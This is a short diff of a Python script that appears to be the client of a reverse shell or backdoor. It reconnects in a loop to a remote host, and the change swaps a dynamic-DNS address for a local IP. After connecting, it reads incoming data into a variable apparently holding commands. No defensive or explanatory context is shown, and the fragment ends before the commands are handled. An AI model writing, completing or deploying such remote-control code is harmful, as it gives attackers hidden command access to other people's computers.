@@ -6,7 +6,7 @@ import sys
 while True:
     try:
         sock = socket.socket()
-        sock.connect(("remote8243.ddns.net", 9696))
+        sock.connect(("192.168.1.34", 25565))
         while True:
             try:
                 comm = sock.recv(1024).decode()
